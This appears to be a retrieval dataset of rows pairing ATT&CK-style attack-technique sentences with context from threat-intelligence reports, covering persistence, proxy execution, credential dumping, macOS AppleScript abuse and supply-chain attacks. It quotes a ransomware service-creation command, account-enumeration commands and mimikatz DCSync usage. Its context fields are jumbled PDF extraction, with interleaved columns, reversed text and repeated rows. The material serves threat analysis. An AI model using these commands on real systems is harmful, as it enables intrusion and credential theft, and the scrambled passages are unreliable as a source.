utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time.,"32.8% t1053.005 scheduled task organizations affected 27.6% 2,740 organizations affected confirmed threats 3,258 the primary task-scheduling component of windows, this technique allows adversarial persistence and execution behaviors to blend in with routine activity emanating from native tools and third-party confirmed threats software. see more > t1053: scheduled task/job “adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.",utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time.,"a task can also be scheduled on a remote system, provided the proper authentication is met (ex: rpc and file and printer sharing in windows environments). scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.” 39 seuqinhcet-bus tnelaverp l 39 t1053: scheduled task/job2021 threat detection report technique t1053.005 scheduled task #4 leveraging the primary task-scheduling component of windows, this technique parent technique rank allows adversarial persistence and execution behaviors to blend in with routine activity emanating from native tools and third-party software.",66f561f73063d2948570024f,3322,1.0000000000000002
"a task can also be scheduled on a remote system, provided the proper authentication is met .",see more > t1053: scheduled task/job “adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time.,"a task can also be scheduled on a remote system, provided the proper authentication is met (ex: rpc and file and printer sharing in windows environments).","scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.” 39 seuqinhcet-bus tnelaverp l 39 t1053: scheduled task/job2021 threat detection report technique t1053.005 scheduled task #4 leveraging the primary task-scheduling component of windows, this technique parent technique rank allows adversarial persistence and execution behaviors to blend in with routine activity emanating from native tools and third-party software. 27.6% analysis organizations affected why do adversaries use scheduled task?",66f561f73063d2948570024f,3323,0.7196412773452097
adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries.,"49.3% t1218.011 organizations affected rundll32 30% 2,380 3,755 organizations affected confirmed threats adversaries use this native windows process to execute malicious code through dynamic link libraries (dll), often to bypass confirmed threats application controls. see more > t1218.005 mshta 18.8% 738 organizations affected confirmed threats mshta is attractive to adversaries both in the early and latter stages of an infection because it enables them to proxy the execution of arbitrary code through a trusted utility.",see more > t1218: signed binary process execution “adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries.,"binaries signed with trusted digital certificates can execute on windows systems protected by digital signature validation. several microsoft signed binaries that are default on windows installations can be used to proxy execution of other files.” 20 seuqinhcet-bus tnelaverp l 20 t1218: signed binary proxy execution2021 threat detection report technique t1218.011 rundll32 #2 adversaries use this native windows process to execute malicious code through parent technique rank dynamic link libraries (dll), often to bypass application controls.",66f561f73063d2948570024f,3151,0.8612999776299799
binaries signed with trusted digital certificates can execute on windows systems protected by digital signature validation.,see more > t1218.005 mshta 18.8% 738 organizations affected confirmed threats mshta is attractive to adversaries both in the early and latter stages of an infection because it enables them to proxy the execution of arbitrary code through a trusted utility. see more > t1218: signed binary process execution “adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries.,binaries signed with trusted digital certificates can execute on windows systems protected by digital signature validation.,"several microsoft signed binaries that are default on windows installations can be used to proxy execution of other files.” 20 seuqinhcet-bus tnelaverp l 20 t1218: signed binary proxy execution2021 threat detection report technique t1218.011 rundll32 #2 adversaries use this native windows process to execute malicious code through parent technique rank dynamic link libraries (dll), often to bypass application controls. analysis 30% why do adversaries use rundll32?",66f561f73063d2948570024f,3152,1.0000000000000002
adversaries may abuse system services or daemons to execute commands or programs.,"l 68 t1105: ingress tool transfer2021 threat detection report technique t1569 system services #9 system services ranks ninth this year thanks almost entirely to detections overall rank associated with its service execution sub-technique. 20.3% t1569.002 service execution organizations affected 19.2% 892 organizations affected confirmed threats adversaries use the windows service manager to run commands or 909 install or manipulate services, often with elevated privilege levels.",see more > confirmed threats t1569: system services “adversaries may abuse system services or daemons to execute commands or programs.,"adversaries can execute malicious content by interacting with or creating services. many services are set to run at boot, which can aid in achieving persistence (create or modify system process), but adversaries can also abuse services for one- time or temporary execution.” 69 seuqinhcet-bus tnelaverp l 69 t1569: system services2021 threat detection report technique t1569.002 service execution #9 adversaries use the windows service manager to run commands or install or parent technique rank manipulate services, often with elevated privilege levels.",66f561f73063d2948570024f,3652,0.7632333276629437
adversaries can execute malicious content by interacting with or creating services either locally or remotely.,"20.3% t1569.002 service execution organizations affected 19.2% 892 organizations affected confirmed threats adversaries use the windows service manager to run commands or 909 install or manipulate services, often with elevated privilege levels. see more > confirmed threats t1569: system services “adversaries may abuse system services or daemons to execute commands or programs.",adversaries can execute malicious content by interacting with or creating services.,"many services are set to run at boot, which can aid in achieving persistence (create or modify system process), but adversaries can also abuse services for one- time or temporary execution.” 69 seuqinhcet-bus tnelaverp l 69 t1569: system services2021 threat detection report technique t1569.002 service execution #9 adversaries use the windows service manager to run commands or install or parent technique rank manipulate services, often with elevated privilege levels. 19.2% analysis organizations affected why do adversaries use service execution?",66f561f73063d2948570024f,3653,0.7876163310853204
adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code.,"when a scheduled task is created without specifying a user context, it will run in the context of the user who created the “adversaries may abuse the windows task. this is the second most common configuration we observed.",task scheduler to perform task scheduling for initial or recurring execution of malicious code.,"there are multiple ways to access the detection task scheduler in windows. the <code>schtasks</code> can be run collection requirements directly on the command line, or the task scheduler can be opened through windows event logs the gui within the administrator tools section of the control panel.",66f561f73063d2948570024f,3354,0.7103600077234297
"the login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin.","(e.g., ticket, network sniffing) known vulnerability exploitation, drive- by download, phishing attack vector, • how did c2 servers access the compromised credential access) environment? (e.g., unknown or unexpected traffic or http, https, ftp, • how was “persistence” achieved?",etc.,"; data encoding or obfuscation; (e.g., new accounts, hooking, startup domain fronting; uncommon ports) item, registry run keys, batch jobs, scheduled tasks) edr and ndr technologies using an edr solution during a ndr deployments give investigators cyber-espionage investigation can access to large amounts of data, which significantly increase the effectiveness they can index for rapid searches to of the investigation. this technology identify anomalies.",66f561943063d2948570024c,854,0.7559371088606488
adversaries may create or modify windows services to repeatedly execute malicious payloads as part of persistence.,"l 32 t1218.005: mshta2021 threat detection report technique t1543 create or modify #3 system process overall rank create or modify system process ranks third this year thanks in large part to detections associated with its windows service sub-technique. 32.8% organizations affected t1059.001 windows service 4.9% 3,324 3,197 organizations affected confirmed threats typically, windows services automatically run with elevated confirmed threats privileges during the boot cycle of the operating system, granting adversaries a means of both persistence and privilege escalation.",see more > t1543: create or modify system process “adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence.,"when operating systems boot up, they can start processes that perform background system functions. on windows and linux, these system processes are referred to as services.",66f561f73063d2948570024f,3267,0.7203847198104856
"when windows boots up, it starts programs or applications called services that perform background system functions.","ragnarlocker deployed custom virtual machines to prevent direct analysis of the encryption malware on the endpoint. as part of its setup script, ragnarlocker leverages sc.exe to create the service vboxdrv using these commands: t1543.003: windows service “adversaries may create or modify sc create vboxdrv binpath= “%binpath%\\\\drivers\\\\ windows services to repeatedly vboxdrv.sys” type= kernel start= auto error= execute malicious payloads as part of persistence.","when windows boots up, it normal displayname= portablevboxdrv’ starts programs or applications called services that perform background system functions.","windows service detection configuration information, including the file path to the service’s executable collection requirements or recovery programs/commands, is stored in the windows registry. service configurations can be modified using command-line monitoring utilities such as sc.exe and reg.” the use of sc.exe to manually create, register, or modify a service is a good indication of malicious use of windows services.",66f561f73063d2948570024f,3295,0.8113859515928408
"windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the windows registry.","as part of its setup script, ragnarlocker leverages sc.exe to create the service vboxdrv using these commands: t1543.003: windows service “adversaries may create or modify sc create vboxdrv binpath= “%binpath%\\\\drivers\\\\ windows services to repeatedly vboxdrv.sys” type= kernel start= auto error= execute malicious payloads as part of persistence. when windows boots up, it normal displayname= portablevboxdrv’ starts programs or applications called services that perform background system functions.","windows service detection configuration information, including the file path to the service’s executable collection requirements or recovery programs/commands, is stored in the windows registry.","service configurations can be modified using command-line monitoring utilities such as sc.exe and reg.” the use of sc.exe to manually create, register, or modify a service is a good indication of malicious use of windows services. while there are many methods of creating and modifying services, adversaries still regularly leverage sc.exe to perform service operations.",66f561f73063d2948570024f,3296,0.9074472071703472
"adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.","it remains among the most versatile of built-in utilities for adversaries, defenders, and system administrators alike. see more > t1059.003 windows command shell 38.4% 1,984 organizations affected confirmed threats while it doesn’t do much on its own, windows command shell can call on virtually any executable on the system to execute batch files and arbitrary tasks.","see more > t1059: command and scripting “adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.","these interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. most systems come with some built-in command-line interface and scripting capabilities, for example, macos and linux distributions include some flavor of unix shell while windows installations include the windows command shell and powershell.” 11 seuqinhcet-bus tnelaverp l 11 t1059: command and scripting interpreter2021 threat detection report technique t1059.001 powershell #1 powershell was the most common technique we observed in 2020, affecting parent technique rank nearly half of our customers.",66f561f73063d2948570024f,3057,0.8001322745669907
adversaries may abuse system services or daemons to execute commands or programs.,"l 68 t1105: ingress tool transfer2021 threat detection report technique t1569 system services #9 system services ranks ninth this year thanks almost entirely to detections overall rank associated with its service execution sub-technique. 20.3% t1569.002 service execution organizations affected 19.2% 892 organizations affected confirmed threats adversaries use the windows service manager to run commands or 909 install or manipulate services, often with elevated privilege levels.",see more > confirmed threats t1569: system services “adversaries may abuse system services or daemons to execute commands or programs.,"adversaries can execute malicious content by interacting with or creating services. many services are set to run at boot, which can aid in achieving persistence (create or modify system process), but adversaries can also abuse services for one- time or temporary execution.” 69 seuqinhcet-bus tnelaverp l 69 t1569: system services2021 threat detection report technique t1569.002 service execution #9 adversaries use the windows service manager to run commands or install or parent technique rank manipulate services, often with elevated privilege levels.",66f561f73063d2948570024f,3652,0.7632333276629437
adversaries can execute malicious content by interacting with or creating services either locally or remotely.,"20.3% t1569.002 service execution organizations affected 19.2% 892 organizations affected confirmed threats adversaries use the windows service manager to run commands or 909 install or manipulate services, often with elevated privilege levels. see more > confirmed threats t1569: system services “adversaries may abuse system services or daemons to execute commands or programs.",adversaries can execute malicious content by interacting with or creating services.,"many services are set to run at boot, which can aid in achieving persistence (create or modify system process), but adversaries can also abuse services for one- time or temporary execution.” 69 seuqinhcet-bus tnelaverp l 69 t1569: system services2021 threat detection report technique t1569.002 service execution #9 adversaries use the windows service manager to run commands or install or parent technique rank manipulate services, often with elevated privilege levels. 19.2% analysis organizations affected why do adversaries use service execution?",66f561f73063d2948570024f,3653,0.7876163310853204
"when windows boots up, it starts programs or applications called services that perform background system functions.","ragnarlocker deployed custom virtual machines to prevent direct analysis of the encryption malware on the endpoint. as part of its setup script, ragnarlocker leverages sc.exe to create the service vboxdrv using these commands: t1543.003: windows service “adversaries may create or modify sc create vboxdrv binpath= “%binpath%\\\\drivers\\\\ windows services to repeatedly vboxdrv.sys” type= kernel start= auto error= execute malicious payloads as part of persistence.","when windows boots up, it normal displayname= portablevboxdrv’ starts programs or applications called services that perform background system functions.","windows service detection configuration information, including the file path to the service’s executable collection requirements or recovery programs/commands, is stored in the windows registry. service configurations can be modified using command-line monitoring utilities such as sc.exe and reg.” the use of sc.exe to manually create, register, or modify a service is a good indication of malicious use of windows services.",66f561f73063d2948570024f,3295,0.8113859515928408
adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise.,"section 4: attack techniques trends new threats form the supply-chain supply chain attacks are motivated by espionage end sabotage of specific targets and can impact any hardware or software component in production supply chain attacks (t1195.001) are considered the most sophisticated form of threats, posing a significant risk for modern organizations. historically such threats are perpetrated by apt exploiting and infiltrating the production pipeline in order to implant malware or for disruption.",as stated by mitre “adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise”.,"supply chain attacks can impact any hardware or software component in production, while the main motivations behinds are espionage end sabotage of specific targets, threat actors may move on to additional tactics and target a broad set of consumers. the 2020 is also the year of the solarwinds supply chain attack.",66f5625a3063d29485700257,460,0.7302772855509047
adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise.,"section 4: attack techniques trends new threats form the supply-chain supply chain attacks are motivated by espionage end sabotage of specific targets and can impact any hardware or software component in production supply chain attacks (t1195.001) are considered the most sophisticated form of threats, posing a significant risk for modern organizations. historically such threats are perpetrated by apt exploiting and infiltrating the production pipeline in order to implant malware or for disruption.",as stated by mitre “adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise”.,"supply chain attacks can impact any hardware or software component in production, while the main motivations behinds are espionage end sabotage of specific targets, threat actors may move on to additional tactics and target a broad set of consumers. the 2020 is also the year of the solarwinds supply chain attack.",66f5625a3063d29485700257,460,0.7259723830636754
"the group has previously exploited cve-2017-8570, cve-2012-1856, cve-2014-4114, cve-2017-0199, cve-2017-11882, and cve-2015-1641.","with timing reminiscent of the 4. cve-2021-1675 4. cve-2020-0796 4. cve-2018-4878 solarwinds orion sunburst backdoor disclosure in december 2020, the most serious vulnerability of 2021, 5. cve-2021-27065 5. cve-2017-11882 5. cve-2019-0752 commonly known as “log4shell” and tracked as cve- 6. cve-2021-36934 6. cve-2020-0674 6. cve-2017-0199 2021-44228, was first publicly disclosed on december 7. cve-2021-40444 7. cve-2019-1367 7. cve-2015-2419 9, 2021. other major vulnerabilities throughout the 8. cve-2021-26855 8. cve-2012-0158 8. cve-2018-20250 year were identified affecting microsoft exchange and windows print spoolers, vmware vcenter, legacy 9. cve-2021-22205 9. cve-2020-14882 9. cve-2017-8750 accellion fta, and the it management company kaseya’s 10. cve-2021-21551 10. cve-2019-1458 10. cve-2012-0158 virtual system administrator. each of these critical 2018 2017 2016 vulnerabilities were exploited by criminal and state- 1. cve-2018-8174 1. cve-2017-0199 1. cve-2016-0189 sponsored threat actors in compromises including data 2. cve-2018-4878 2. cve-2016-0189 2. cve-2016-1019 breaches and ransomware attacks that had far-reaching consequences for vendors in all industry tiers.","3. cve-2017-11882 3. cve-2017-0022 3. cve-2016-4117 4. cve-2017-8750 4. cve-2016-7200 4. cve-2015-8651 the severity of many of the disclosed and exploited vulnerabilities in 2021, particularly the log4shell 5. cve-2017-0199 5. cve-2016-7201 5. cve-2016-0034 vulnerabilities and the numerous vulnerabilities 6. cve-2016-0189 6. cve-2015-8651 6. cve-2016-1010 associated with microsoft technologies, should not 7. cve-2017-8570 7. cve-2014-6332 7. cve-2014-4113 distract from the number and diversity of affected 8. cve-2018-8373 8. cve-2016-4117 8. cve-2015-8446 products throughout 2021. high-risk vulnerabilities 9. cve-2012-0158 9. cve-2016-1019 9. cve-2016-3298 and actively exploited vulnerabilities disclosed in 2021 affected products belonging to a more diverse array of 10. cve-2015-1805 10. cve-2017-0037 10. cve-2015-7645 parent companies than prior years.","outside of the top table 1: top exploited vulnerabilities between 2016 and 2021, with repeats designated by color. (source: recorded future) 10, which mainly affected microsoft products, serious actively exploited vulnerabilities were also identified affecting products from linux, google, pulse connect secure, and apple, among others.",66f5631b3063d29485700262,3664,0.7091967687233195
unc2452 set the hostnames of its c2 infrastructure to match legitimate hostnames in the victim environment.,• memory-only dropper and malleable beacons. • ip addresses located in different countries.,• attacker hostnames match victim environment.,"• use a dga algorithm and intermediary c2. moreover, the backdoor behavior is masqueraded inside the legit solarwinds activity as the orion improvement program (oip).",66f5625a3063d29485700257,473,0.7081089695510672
apt29 has set the hostnames of its c2 infrastructure to match legitimate hostnames in the victim environment.,• memory-only dropper and malleable beacons. • ip addresses located in different countries.,• attacker hostnames match victim environment.,"• use a dga algorithm and intermediary c2. moreover, the backdoor behavior is masqueraded inside the legit solarwinds activity as the orion improvement program (oip).",66f5625a3063d29485700257,473,0.7032997490917291
adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.,"section 4: attack techniques trends new threats form the supply-chain supply chain attacks are motivated by espionage end sabotage of specific targets and can impact any hardware or software component in production supply chain attacks (t1195.001) are considered the most sophisticated form of threats, posing a significant risk for modern organizations. historically such threats are perpetrated by apt exploiting and infiltrating the production pipeline in order to implant malware or for disruption.",as stated by mitre “adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise”.,"supply chain attacks can impact any hardware or software component in production, while the main motivations behinds are espionage end sabotage of specific targets, threat actors may move on to additional tactics and target a broad set of consumers. the 2020 is also the year of the solarwinds supply chain attack.",66f5625a3063d29485700257,460,0.8979859123969556
unc2452 set the hostnames of its c2 infrastructure to match legitimate hostnames in the victim environment.,• memory-only dropper and malleable beacons. • ip addresses located in different countries.,• attacker hostnames match victim environment.,"• use a dga algorithm and intermediary c2. moreover, the backdoor behavior is masqueraded inside the legit solarwinds activity as the orion improvement program (oip).",66f5625a3063d29485700257,473,0.7081089695510672
ursnif has used a peer-to-peer  network for c2.,"collaboration: in partnership aspects of various malware and also evolve their approaches in an attempt to stay collaboration: worked closely with with internet service providers, provide these insights to microsoft’s a step head. here is a timeline showing a sample the fbi and europol’s cybercrime governments, law enforcement, legal team to develop an effective center to bring down the peer-to- and private industry, microsoft of the botnets disrupted by dcu and the strategies disruption strategy.",peer infrastructure.,"shared information to remediate microsoft adopted to shut them down. microsoft response: joined the zero over 17 million malware access network, replaced the criminal victims worldwide.",66f564763063d29485700275,3185,0.7337600661531581
"once credentials are obtained, they can be used to perform lateral movement and access restricted information.","modern asian apt groups: tactics, techniques and procedurestechnical details | defense evasion ta0005 | masquerading: masquerade task or service t1036.004 contents 175 event source log event id windows system 7045 windows security 4688, 4697 windows taskscheduler 106, 200, 201 sysmon sysmon 1, 13 sigma rules • sigma-generic-creating windows service appearing to be legitimate modern asian apt groups: tactics, techniques and procedurestechnical details | credential access ta0006 | os credential dumping t1003 contents 176 credential access ta0006 os credential dumping t1003 basic description threat actors may attempt to dump account login credentials from the operating system or other software. these credentials are normally in the form of a password hash or cleartext password.",the obtained credentials can then be used for lateral movement and access to restricted information.,"modern asian apt groups: tactics, techniques and procedurestechnical details | credential access ta0006 | os credential dumping: lsass memory t1003.001 contents 177 os credential dumping: lsass memory t1003.001 basic description the subtechnique known as os credential dumping: lsass memory t1003.001 is used by attackers to obtain credentials in a windows os. this technique involves obtaining account credentials by dumping the memory of the process known as lsass (local security authority subsystem service) in windows operating systems.",66f5674f3063d2948570028e,4009,0.7841498398325092
on macos the dscl .,"to get this type of information, you can use various tools and commands such as whoami to get the name of the user in whose context a process is running. in macos and linux, the currently logged-in user can be identified by using the “w” and “who” commands.","in macos, the command “dscl .","list /users | grep -v '_' “ can also be used to enumerate user accounts. to access this information, you can also use environment variables such as %username% and $user.",66f5674f3063d2948570028e,4301,0.8917243224723232
credentials can then be used to perform lateral movement and access restricted information.,"modern asian apt groups: tactics, techniques and procedurestechnical details | defense evasion ta0005 | masquerading: masquerade task or service t1036.004 contents 175 event source log event id windows system 7045 windows security 4688, 4697 windows taskscheduler 106, 200, 201 sysmon sysmon 1, 13 sigma rules • sigma-generic-creating windows service appearing to be legitimate modern asian apt groups: tactics, techniques and procedurestechnical details | credential access ta0006 | os credential dumping t1003 contents 176 credential access ta0006 os credential dumping t1003 basic description threat actors may attempt to dump account login credentials from the operating system or other software. these credentials are normally in the form of a password hash or cleartext password.",the obtained credentials can then be used for lateral movement and access to restricted information.,"modern asian apt groups: tactics, techniques and procedurestechnical details | credential access ta0006 | os credential dumping: lsass memory t1003.001 contents 177 os credential dumping: lsass memory t1003.001 basic description the subtechnique known as os credential dumping: lsass memory t1003.001 is used by attackers to obtain credentials in a windows os. this technique involves obtaining account credentials by dumping the memory of the process known as lsass (local security authority subsystem service) in windows operating systems.",66f5674f3063d2948570028e,4009,0.8621949639244836
"in macos and linux, the currently logged in user can be identified with w and who.","useful information may include the rights to specific files/directories, information about sessions, the owner of running processes, or system event logs. to get this type of information, you can use various tools and commands such as whoami to get the name of the user in whose context a process is running.","in macos and linux, the currently logged-in user can be identified by using the “w” and “who” commands.","in macos, the command “dscl . list /users | grep -v '_' “ can also be used to enumerate user accounts.",66f5674f3063d2948570028e,4300,0.9241779377995016
list /users | grep -v '_' command can also be used to enumerate user accounts.,"in macos and linux, the currently logged-in user can be identified by using the “w” and “who” commands. in macos, the command “dscl .",list /users | grep -v '_' “ can also be used to enumerate user accounts.,"to access this information, you can also use environment variables such as %username% and $user. on network devices, cli commands such as ""show users"" and ""show ssh"" can also be used to display the current users.",66f5674f3063d2948570028e,4302,0.9696579084306538
"environment variables, such as %username% and $user, may also be used to access this information.","in macos, the command “dscl . list /users | grep -v '_' “ can also be used to enumerate user accounts.","to access this information, you can also use environment variables such as %username% and $user.","on network devices, cli commands such as ""show users"" and ""show ssh"" can also be used to display the current users. examples of procedures below are some examples that we encountered when analyzing the incidents described above: quser.exe whoami quser.exe quser $system32\\\\cmd.exe /c whoami detection one of the ways to detect the system owner/user discovery t1033 technique is to track process creation events and the execution of powershell script blocks.",66f5674f3063d2948570028e,4303,0.8424113633537554
"by default, /etc/shadow is only readable by the root user.","2. /etc/shadow: this file is used to store the password hashes and other information related to user authentication, such as the last time the password was changed and the date on which the account will expire.",this file is only readable by the root user.,"3. pam (pluggable authentication modules): pam is a framework that allows linux and macos systems to use multiple authentication methods, such as local password authentication, kerberos, and smart cards. pam is configured through a series of files located in the /etc/pam.d directory.",66f5676b3063d2948570028f,430,0.7381305107861842
"scripts can be run from the command-line via osascript /path/to/script or osascript -e ""script here"".","in addition, applescript can be used to execute native apis nsapplescript or osascript on macos 10.10 yosemite and later. applescript can be run from the command-line using the osascript command.","while the osascript /path/to/applescriptfile command is used to run a script file, osascript -e ""script here"" command is used to run an applescript command directly from the command line.","adversary use of applescript adversaries can perform a variety of malicious activities by applescript. 1. persistence via launch agent (t1543.001), launch daemon (t1543.004) and plist file modification (t1647) the macos.osaminer, a monero mining trojan, has used osascript to call itself via the do shell script command in the launch agent .plist file [13].",66f5676b3063d2948570028f,239,0.7229666868030924
"adversaries may abuse applescript to execute various behaviors, such as interacting with an open ssh connection, moving to remote machines, and even presenting users with fake dialog boxes.","as applescript uses appleevents to communicate with applications, it can access and manipulate their functions and data, allowing adversaries to perform various actions. despite their broad functionalities, appleevents cannot remotely start applications, only interacting with those already running.","this can include interacting with open ssh connections, moving to remote machines, and presenting users with fake dialog boxes.","in addition, applescript can be used to execute native apis nsapplescript or osascript on macos 10.10 yosemite and later. applescript can be run from the command-line using the osascript command.",66f5676b3063d2948570028f,236,0.7511773210723942
thiefquest uses applescript's osascript -e command to launch thiefquest's persistence via launch agent and launch daemon.,"adversary use of applescript adversaries can perform a variety of malicious activities by applescript. 1. persistence via launch agent (t1543.001), launch daemon (t1543.004) and plist file modification (t1647) the macos.osaminer, a monero mining trojan, has used osascript to call itself via the do shell script command in the launch agent .plist file [13].","thiefquest, a data-stealer malware, is also known for using applescript's ""osascript -e"" command to launch thiefquest's persistence via launch agent and launch daemon [14].","2. abusing macos applications in addition to these commands, apple scripts can be run via leveraging various ways like mail rules, calendar.app alarms, and automator workflows [15]. 223. credential access with gui input capture (t1056.002) for instance, in one scenario, malware developers used the following applescript in malware* to lure the user into a being-looking software update dialog to submit their password.",66f5676b3063d2948570028f,242,0.8805413445025569
"additionally, it searches for the "".vnc.lnk"" affix to steal vnc credentials.","once connected, the adversary can interact with the remote system's desktop and potentially move on to other systems. trickbot, a modular botnet and banking trojan, uses a vnc module for remote control and an smb module for lateral movement in a compromised network [117].",trickbot also uses vnc to steal credentials by searching for the .vnc.lnk affix [118].,"1173. data exfiltration adversaries also use vnc to exfiltrate sensitive data. researchers revealed a new ursnif malware variant dubbed ldr4, a generic backdoor designed to facilitate operations such as data exfiltration [119].",66f5676b3063d2948570028f,1309,0.7080710478158387
"lsadump also includes netsync, which performs dcsync over a legacy replication protocol.",this would allow the attacker to log in to the system using the new account and potentially maintain a foothold on the system. mimikatz includes dcsync as a command in the lsadump module (lsadump::dcsync) that simulates the behavior of a domain controller and requests other domain controllers to synchronize a specified entry and replicate information using the ms-drsr.,"lsadump also includes netsync, which implements dcsync over a traditional replication protocol.","to use the lsadump::dcsync module, an attacker would need to run mimikatz on a compromised system and use it to obtain the necessary credentials and permissions. they would then use the dcsync command to specify the target dc and the entry that they want to replicate, and initiate the replication process.",66f5676b3063d2948570028f,591,0.7645639356523486
adversaries may use valid accounts to interact with remote machines by taking advantage of distributed component object model .,"by default, only administrators may remotely activate and launch com objects through dcom. it is important to secure dcom and properly configure access control to prevent unauthorized access or abuse.",adversary use of distributed component object model one way adversaries may use dcom is by taking advantage of valid accounts to interact with remote machines.,"dcom uses access control lists (acls) in the registry to specify permissions for interacting with local and remote server com objects. by default, only administrators have the privilege to activate and launch com objects remotely through dcom.",66f5676b3063d2948570028f,1258,0.865570926821395
permissions to interact with local and remote server com objects are specified by access control lists  in the registry.,"dcom is used in a variety of applications, such as distributed applications, web services, and system management. it is an important part of the windows operating system and is widely used in enterprise environments.",permissions to interact with local and remote server com objects are specified by access control lists (acl) in the registry.,"by default, only administrators may remotely activate and launch com objects through dcom. it is important to secure dcom and properly configure access control to prevent unauthorized access or abuse.",66f5676b3063d2948570028f,1255,0.9206603243940822
"by default, only administrators may remotely activate and launch com objects through dcom.",it is an important part of the windows operating system and is widely used in enterprise environments. permissions to interact with local and remote server com objects are specified by access control lists (acl) in the registry.,"by default, only administrators may remotely activate and launch com objects through dcom.",it is important to secure dcom and properly configure access control to prevent unauthorized access or abuse. adversary use of distributed component object model one way adversaries may use dcom is by taking advantage of valid accounts to interact with remote machines.,66f5676b3063d2948570028f,1256,1.0000000000000002
"by default, only administrators may remotely activate and launch com objects through dcom.",adversary use of distributed component object model one way adversaries may use dcom is by taking advantage of valid accounts to interact with remote machines. dcom uses access control lists (acls) in the registry to specify permissions for interacting with local and remote server com objects.,"by default, only administrators have the privilege to activate and launch com objects remotely through dcom.","if an adversary is able to compromise an account with sufficient privileges, they can use dcom to perform actions as the logged-on user. dcom can also be used as a method of remotely interacting with wmi, which is a powerful system management tool that provides information about the hardware and software configuration of a computer.",66f5676b3063d2948570028f,1260,0.9166067880920981
"adversaries may use exploits during various phases of the adversary lifecycle  exploit public-facing application, exploitation for client execution, exploitation for privilege escalation, exploitation for defense evasion, exploitation for credential access, exploitation of remote services, and application or system exploitation.","in contrast, there are useful resources to a proof-of-concept exploit but quickly deleted their account. the such as cisa's known exploited vulnerabilities (kev) catalog38 that vulnerability, cve-2022-22965, received a severity rating of 9.8 out of ransomware remains the 03 primary strategic threat can help organizations prioritize based on evidence of observed 10 and was soon dubbed 'spring4shell'.",exploitation.,"similarly, secureworks vulnerability detection and response39 (vdr) platform helps organizations make better like the log4shell vulnerability (cve-2021-44228) that emerged in ransomware enablers: 04 prioritization decisions by combining global context about ease and december 2021, spring4shell appeared to have the potential to impact loaders and infostealers impact of exploitation and threat intelligence about active exploitation many organizations. spring is considered40 one of the world's most with local context about the assets operated by the customer.",66f567953063d29485700291,2787,0.7425589356160887
registration of new windows classes can include a request for up to 40 bytes of ewm to be appended to the allocated memory of each instance of that class.,"in the windows operating system, a window class is a data structure that specifies the appearance and behavior of a window. when a process creates a window, it must first register a window class that defines the characteristics of the window.","as part of this registration process, the process can request that up to 40 bytes of extra memory (ewm) be allocated for each instance of the class.","this extra memory is intended to store data specific to the window and can be accessed using specific api functions, such as getwindowlong and setwindowlong. these functions take the window handle as the first argument and the index of the field to be retrieved or set as the second argument.",66f5676b3063d2948570028f,928,0.7593189904375008
"malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in ewm, then invoking execution by returning execution control to the address in the process’s ewm.","adversary use of extra window memory injection the ewm is large enough to store a 32-bit pointer, which can point to a windows procedure (a.k.a window proc). a window procedure is a function that handles input and output for a window, including messages sent to the window and actions performed by the window.","malware may attempt to use the ewm as part of an attack chain in which it writes code to shared sections of memory within a process, places a pointer to that code in the ewm, and then executes the code by returning control to the address stored in the ewm.","this technique, known as extra window memory injection (ewmi), allows the malware to execute code within the context of a target process, giving it access to both the process's memory and potentially elevated privileges. malware developers may use this technique to avoid detection by writing payloads to shared sections of memory rather than using api calls like writeprocessmemory and createremotethread, which are more closely monitored.",66f5676b3063d2948570028f,934,0.7434041734001585
more sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention  by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.,"this technique, known as extra window memory injection (ewmi), allows the malware to execute code within the context of a target process, giving it access to both the process's memory and potentially elevated privileges. malware developers may use this technique to avoid detection by writing payloads to shared sections of memory rather than using api calls like writeprocessmemory and createremotethread, which are more closely monitored.",more sophisticated malware may also bypass security measures like data execution prevention (dep) by triggering a series of windows procedures and other system functions that rewrite the malicious payload within an executable portion of the target process.,this allows the malware to execute its code while bypassing dep and other protection mechanisms. 82#4.9.,66f5676b3063d2948570028f,937,0.7300058373138061
jscript is interpreted via the windows script engine and thus integrated with many components of windows such as the component object model and internet explorer html application  pages.,its versatility and widespread use make it a useful tool for exploiting vulnerabilities in web browsers and applications. jscript : jscript is the microsoft implementation of the ecmascript standard and is used similarly to javascript.,"jscript is integrated with many components of the windows operating system, such as the component object model and internet explorer html application (hta) pages.",jscript is interpreted by the windows script engine and is commonly used to add dynamic and interactive features to web pages. javascript for automation (jxa): javascript for automation (jxa) is a macos scripting language based on javascript and is included as part of apple's open scripting architecture (osa).,66f5676b3063d2948570028f,354,0.7776185931010197
